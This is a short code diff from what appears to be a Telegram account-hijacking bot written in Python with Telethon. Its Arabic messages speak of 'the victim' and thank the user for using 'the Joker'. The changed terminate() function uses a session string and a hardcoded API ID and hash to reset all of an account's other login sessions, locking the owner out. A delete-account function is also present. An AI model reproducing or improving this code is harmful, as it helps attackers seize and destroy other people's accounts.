@@ -55,8 +55,11 @@ async def userinfo(strses):
 
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    await X(rt())
+    try:
+        await X(rt())
+        return True
+    except Exception as rr:
+        return rr
 
 GROUP_LIST = []
 async def delacc(strses):
@@ -396,7 +399,10 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+      if i == True:
+      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+      else:
+          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @rd0r0\n{i}")
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
